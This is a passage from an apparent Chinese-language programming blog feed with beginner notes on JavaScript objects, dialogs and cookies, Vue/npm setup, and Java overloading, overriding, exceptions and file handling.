<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> message=<span class="string">"Hello world!"</span>;</span><br><span class="line"><span class="keyword">var</span> x=message.toUpperCase();<span class="comment">//x=HELLO WORLD!</span></span><br></pre></td></tr></table></figure>

<h2 id="创建-JavaScript-对象"><a href="#创建-JavaScript-对象" class="headerlink" title="创建 JavaScript 对象"></a>创建 JavaScript 对象</h2><ul>
<li>定义并创建对象的实例</li>
<li>使用函数来定义对象，然后创建新的对象实例</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">person=<span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">person.firstname=<span class="string">"John"</span>;</span><br><span class="line">person.lastname=<span class="string">"Doe"</span>;</span><br><span class="line">person.age=<span class="number">50</span>;</span><br><span class="line">person.eyecolor=<span class="string">"blue"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用对象 literals</span></span><br><span class="line">person=&#123;<span class="attr">firstname</span>:<span class="string">"John"</span>,<span class="attr">lastname</span>:<span class="string">"Doe"</span>,<span class="attr">age</span>:<span class="number">50</span>,<span class="attr">eyecolor</span>:<span class="string">"blue"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用对象构造器</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params">firstname,lastname,age,eyecolor</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.firstname=firstname;</span><br><span class="line"><span class="keyword">this</span>.lastname=lastname;</span><br><span class="line"><span class="keyword">this</span>.age=age;</span><br><span class="line"><span class="keyword">this</span>.eyecolor=eyecolor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript-for…in-循环"><a href="#JavaScript-for…in-循环" class="headerlink" title="JavaScript for…in 循环"></a>JavaScript for…in 循环</h2><p>语法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (variable <span class="keyword">in</span> object)</span><br><span class="line">&#123;</span><br><span class="line">	执行的代码……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="JavaScript-对象-1"><a href="#JavaScript-对象-1" class="headerlink" title="JavaScript 对象"></a>JavaScript 对象</h1><p>JavaScript 中的所有事物都是对象：字符串、数值、数组、函数…</p>
<p>对象只是一种特殊的数据。对象拥有<strong>属性</strong>和<strong>方法</strong>。</p>
<ul>
<li><h2 id="访问对象的属性-1"><a href="#访问对象的属性-1" class="headerlink" title="访问对象的属性"></a>访问对象的属性</h2></li>
</ul>
<p>语法：<code>objectName.propertyName</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> message=<span class="string">"Hello World!"</span>;</span><br><span class="line"><span class="keyword">var</span> x=message.length;<span class="comment">//x=12</span></span><br></pre></td></tr></table></figure>

<ul>
<li><h2 id="访问对象的方法-1"><a href="#访问对象的方法-1" class="headerlink" title="访问对象的方法"></a>访问对象的方法</h2></li>
</ul>
<p>语法：<code>objectName.methodName()</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> message=<span class="string">"Hello world!"</span>;</span><br><span class="line"><span class="keyword">var</span> x=message.toUpperCase();<span class="comment">//x=HELLO WORLD!</span></span><br></pre></td></tr></table></figure>

<h2 id="创建-JavaScript-对象-1"><a href="#创建-JavaScript-对象-1" class="headerlink" title="创建 JavaScript 对象"></a>创建 JavaScript 对象</h2><ul>
<li>定义并创建对象的实例</li>
<li>使用函数来定义对象，然后创建新的对象实例</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">person=<span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">person.firstname=<span class="string">"John"</span>;</span><br><span class="line">person.lastname=<span class="string">"Doe"</span>;</span><br><span class="line">person.age=<span class="number">50</span>;</span><br><span class="line">person.eyecolor=<span class="string">"blue"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用对象 literals</span></span><br><span class="line">person=&#123;<span class="attr">firstname</span>:<span class="string">"John"</span>,<span class="attr">lastname</span>:<span class="string">"Doe"</span>,<span class="attr">age</span>:<span class="number">50</span>,<span class="attr">eyecolor</span>:<span class="string">"blue"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用对象构造器</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params">firstname,lastname,age,eyecolor</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.firstname=firstname;</span><br><span class="line"><span class="keyword">this</span>.lastname=lastname;</span><br><span class="line"><span class="keyword">this</span>.age=age;</span><br><span class="line"><span class="keyword">this</span>.eyecolor=eyecolor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript-for…in-循环-1"><a href="#JavaScript-for…in-循环-1" class="headerlink" title="JavaScript for…in 循环"></a>JavaScript for…in 循环</h2><p>语法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (variable <span class="keyword">in</span> object)</span><br><span class="line">&#123;</span><br><span class="line">	执行的代码……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="JavaScript-弹窗"><a href="#JavaScript-弹窗" class="headerlink" title="JavaScript 弹窗"></a>JavaScript 弹窗</h1><h2 id="警告框"><a href="#警告框" class="headerlink" title="警告框"></a>警告框</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.alert(<span class="string">"sometext"</span>);</span><br></pre></td></tr></table></figure>

<h2 id="确认框"><a href="#确认框" class="headerlink" title="确认框"></a>确认框</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.confirm(<span class="string">"sometext"</span>);</span><br></pre></td></tr></table></figure>

<h2 id="提示框"><a href="#提示框" class="headerlink" title="提示框"></a>提示框</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.prompt(<span class="string">"sometext"</span>,<span class="string">"defaultvalue"</span>);</span><br></pre></td></tr></table></figure>

<h1 id="JavaScript-计时事件"><a href="#JavaScript-计时事件" class="headerlink" title="JavaScript 计时事件"></a>JavaScript 计时事件</h1><ul>
<li>setInterval() - 间隔指定的毫秒数不停地执行指定的代码。</li>
</ul>
<p>语法：<code>window.setInterval(&quot;javascript function&quot;,milliseconds);</code></p>
<ul>
<li>setTimeout() - 暂停指定的毫秒数后执行指定的代码</li>
</ul>
<p>语法：<code>window.setTimeout(&quot;javascript 函数&quot;,毫秒数);</code></p>
<h1 id="JavaScript-Cookie"><a href="#JavaScript-Cookie" class="headerlink" title="JavaScript Cookie"></a>JavaScript Cookie</h1><p>JavaScript 可以使用 <strong>document.cookie</strong> 属性来创建 、读取、及删除 cookie。</p>
<p>创建 cookie </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie=<span class="string">"username=John Doe"</span>;</span><br></pre></td></tr></table></figure>

<p>读取 Cookie</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>

<p>修改 cookie(旧的被覆盖)</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie=<span class="string">"username=John Smith; expires=Thu, 18 Dec 2013 12:00:00 GMT; path=/"</span>;</span><br></pre></td></tr></table></figure>

<p>删除 cookie</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie = <span class="string">"username=; expires=Thu, 01 Jan 1970 00:00:00 GMT"</span>;</span><br></pre></td></tr></table></figure>

<h2 id="完整实例"><a href="#完整实例" class="headerlink" title="完整实例"></a>完整实例</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">cname,cvalue,exdays</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    d.setTime(d.getTime()+(exdays*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1000</span>));</span><br><span class="line">    <span class="keyword">var</span> expires = <span class="string">"expires="</span>+d.toGMTString();</span><br><span class="line">    <span class="built_in">document</span>.cookie = cname+<span class="string">"="</span>+cvalue+<span class="string">"; "</span>+expires;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">cname</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name = cname + <span class="string">"="</span>;</span><br><span class="line">    <span class="keyword">var</span> ca = <span class="built_in">document</span>.cookie.split(<span class="string">';'</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;ca.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> c = ca[i].trim();</span><br><span class="line">        <span class="keyword">if</span> (c.indexOf(name)==<span class="number">0</span>) &#123; <span class="keyword">return</span> c.substring(name.length,c.length); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCookie</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> user=getCookie(<span class="string">"username"</span>);</span><br><span class="line">    <span class="keyword">if</span> (user!=<span class="string">""</span>)&#123;</span><br><span class="line">        alert(<span class="string">"欢迎 "</span> + user + <span class="string">" 再次访问"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        user = prompt(<span class="string">"请输入你的名字:"</span>,<span class="string">""</span>);</span><br><span class="line">        <span class="keyword">if</span> (user!=<span class="string">""</span> &amp;&amp; user!=<span class="literal">null</span>)&#123;</span><br><span class="line">            setCookie(<span class="string">"username"</span>,user,<span class="number">30</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> 前端 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[vue环境配置]]></title>
      <url>/2019/11/03/vue%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      <content type="html"><![CDATA[<h1 id="三个概念"><a href="#三个概念" class="headerlink" title="三个概念"></a>三个概念</h1><ul>
<li>node.js：JavaScript运行环境 </li>
<li>npm:：JavaScript的包管理工具</li>
<li>vue:一套用于构建用户界面的渐进式框架</li>
</ul>
<h2 id="node-js安装"><a href="#node-js安装" class="headerlink" title="node.js安装"></a>node.js安装</h2><p>下载地址:<code>http://nodejs.cn/download/</code></p>
<p>安装完后CMD中使用：node -v 验证是否成功</p>
<h1 id="npm安装"><a href="#npm安装" class="headerlink" title="npm安装"></a>npm安装</h1><p>默认自动安装npm</p>
<p>但是国内使用npm比较慢，我用淘宝开发的cnpm</p>
<h2 id="安装方式"><a href="#安装方式" class="headerlink" title="安装方式"></a>安装方式</h2><p>CMD中输入：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>

<p>安装完后CMD中使用：cnpm -v 验证是否成功</p>
<h1 id="vue安装"><a href="#vue安装" class="headerlink" title="vue安装"></a>vue安装</h1><p>vue-cli(vue官方命令行工具)全局安装</p>
<p>CMD中输入：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install --global vue-cli</span><br></pre></td></tr></table></figure>

<p>创建VUE项目</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue init webpack 项目名称(英文)</span><br></pre></td></tr></table></figure>

<p>进入项目文件夹</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> 项目名称</span><br></pre></td></tr></table></figure>

<p>安装该工程依赖的模块</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install</span><br></pre></td></tr></table></figure>

<p>运行该项目</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm run dev</span><br></pre></td></tr></table></figure>

<p>地址：<a href="http://localhost:8088" target="_blank" rel="noopener">http://localhost:8088</a></p>
<h1 id="项目文件夹说明"><a href="#项目文件夹说明" class="headerlink" title="项目文件夹说明"></a>项目文件夹说明</h1><p>build：最终发布代码存放的位置。<br>config：配置文件 端口等。<br>node_modules：npm加载的项目依赖模块以及后续的第三方组件和功能<br>src：我们开发的目录<br>app.vue：根组件<br>main.js：入口js文件<br>router：显目路由<br>static：存放静态</p>
<p>…</p>
]]></content>
      
        <categories>
            
            <category> 前端 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> VUE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java重载和重写]]></title>
      <url>/2019/10/05/Java%E9%87%8D%E8%BD%BD%E5%92%8C%E9%87%8D%E5%86%99/</url>
      <content type="html"><![CDATA[<h1 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h1><blockquote>
<p>重载(overloading) 是在一个类里面，方法名字相同，而参数不同。返回类型可以相同也可以不同</p>
</blockquote>
<ul>
<li>被重载的方法必须改变参数列表(参数个数或类型不一样)；</li>
<li>被重载的方法可以改变返回类型；</li>
<li>被重载的方法可以改变访问修饰符；</li>
<li>被重载的方法可以声明新的或更广的检查异常；</li>
<li>方法能够在同一个类中或者在一个子类中被重载。</li>
<li>无法以返回值类型作为重载函数的区分标准。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Overloading</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;<span class="comment">//方法重载</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>；</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h1><blockquote>
<p>重写是子类对父类的允许访问的方法的实现过程进行重新编写, 返回值和形参都不能改变</p>
</blockquote>
<ul>
<li>参数列表必须完全与被重写方法的相同。</li>
<li>返回类型与被重写方法的返回类型可以不相同，但是必须是父类返回值的派生类（java5 及更早版本返回类型要一样，java7 及更高版本可以不同）。</li>
<li>访问权限不能比父类中被重写的方法的访问权限更低。例如：如果父类的一个方法被声明为 public，那么在子类中重写该方法就不能声明为 protected。</li>
<li>父类的成员方法只能被它的子类重写。</li>
<li>声明为 final 的方法不能被重写。</li>
<li>声明为 static 的方法不能被重写，但是能够被再次声明。</li>
<li>子类和父类在同一个包中，那么子类可以重写父类所有方法，除了声明为 private 和 final 的方法。</li>
<li>子类和父类不在同一个包中，那么子类只能够重写父类的声明为 public 和 protected 的非 final 方法。</li>
<li>重写的方法能够抛出任何非强制异常，无论被重写的方法是否抛出异常。但是，重写的方法不能抛出新的强制性异常，或者比被重写方法声明的更广泛的强制性异常，反之则可以。</li>
<li>构造方法不能被重写。</li>
<li>如果不能继承一个方法，则不能重写这个方法。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">move</span><span class="params">()</span></span>&#123;<span class="comment">//父类方法</span></span><br><span class="line">       </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">move</span><span class="params">()</span></span>&#123;<span class="comment">//方法重写</span></span><br><span class="line">       </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><table>
<thead>
<tr>
<th align="center">区别点</th>
<th align="left">重载方法</th>
<th align="left">重写方法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">参数列表</td>
<td align="left">必须修改</td>
<td align="left">一定不能修改</td>
</tr>
<tr>
<td align="center">返回类型</td>
<td align="left">可以修改</td>
<td align="left">一定不能修改</td>
</tr>
<tr>
<td align="center">异常</td>
<td align="left">可以修改</td>
<td align="left">可以减少或删除，一定不能抛出新的或者更广的异常</td>
</tr>
<tr>
<td align="center">访问</td>
<td align="left">可以修改</td>
<td align="left">一定不能做更严格的限制（可以降低限制）</td>
</tr>
</tbody></table>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>(1) 方法重载是一个类中定义了多个方法名相同,而他们的参数的数量不同或数量相同而类型和次序不同,则称为方法的重载(Overloading)。</p>
<p>(2) 方法重写是在子类存在方法与父类的方法的名字相同,而且参数的个数与类型一样,返回值也一样的方法,就称为重写(Overriding)。</p>
<p>(3) 方法重载是一个类的多态性表现,而方法重写是子类与父类的一种多态性表现。</p>
]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java异常处理]]></title>
      <url>/2019/10/05/Java%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
      <content type="html"><![CDATA[<h1 id="异常产生"><a href="#异常产生" class="headerlink" title="异常产生"></a>异常产生</h1><p>异常是程序中的一些错误，但并不是所有的错误都是异常，并且错误有时候是可以避免的。</p>
<h1 id="Exception-类的层次"><a href="#Exception-类的层次" class="headerlink" title="Exception 类的层次"></a>Exception 类的层次</h1><ul>
<li>Throwable<ul>
<li>Error</li>
<li>Exception<ul>
<li>IOException</li>
<li>RuntimeException</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="Try-Catch-Finally处理"><a href="#Try-Catch-Finally处理" class="headerlink" title="Try-Catch-Finally处理"></a>Try-Catch-Finally处理</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//可能出现异常的语句</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常名称 e)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//异常处理</span></span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">    <span class="comment">//无论如何都执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="异常交给被调用处处理"><a href="#异常交给被调用处处理" class="headerlink" title="异常交给被调用处处理"></a>异常交给被调用处处理</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AException</span> <span class="keyword">extends</span> <span class="title">Exception</span> </span>&#123;</span><br><span class="line">		<span class="comment">//内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="自定义异常处理"><a href="#自定义异常处理" class="headerlink" title="自定义异常处理"></a>自定义异常处理</h1><p>继承异常类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyException</span> <span class="keyword">extends</span> <span class="title">Exception</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span>  <span class="title">DieException</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(message);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用自定义异常类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DieExceptionTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		Die d = <span class="keyword">new</span> Die();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			d.setFaceValue(<span class="number">8</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (DieException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			System.out.println(e);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Die</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> faceValue;</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFaceValue</span><span class="params">(<span class="keyword">int</span> x)</span> <span class="keyword">throws</span> DieException</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(x&lt;<span class="number">0</span>||x&gt;<span class="number">6</span>) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> DieException(<span class="string">"请输入0到6的数字"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			faceValue = x;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java文件处理]]></title>
      <url>/2019/10/05/Java%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/</url>
      <content type="html"><![CDATA[<h1 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h1><p>Java文件类以抽象的方式代表文件名和目录路径名。该类主要用于文件和目录的创建、文件的查找和文件的删除等。</p>
<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><ul>
<li>Flie</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">File</span><span class="params">(String pathname)</span></span>;<span class="comment">//绝对路径</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">File</span><span class="params">(File parent,String child)</span></span>;<span class="comment">//相对路径</span></span><br><span class="line"><span class="comment">/*separator可以用来代替“/”和“\”*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> File <span class="title">getParentFile</span><span class="params">()</span></span>;<span class="comment">//获取父目录路径</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">mkdir</span><span class="params">()</span></span>;<span class="comment">//创建单级目录</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">mkdirs</span><span class="params">()</span></span>;<span class="comment">//创建多级目录</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">createNewFile</span><span class="params">()</span></span>;<span class="comment">//创建新文件</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">exists</span><span class="params">()</span></span>;<span class="comment">//判断文件是否存在</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">delete</span><span class="params">()</span></span>;<span class="comment">//删除文件</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canRead</span><span class="params">()</span></span>;<span class="comment">//可读</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canWrite</span><span class="params">()</span></span>;<span class="comment">//可写</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canExecute</span><span class="params">()</span></span>;<span class="comment">//可执行</span></span><br></pre></td></tr></table></figure>

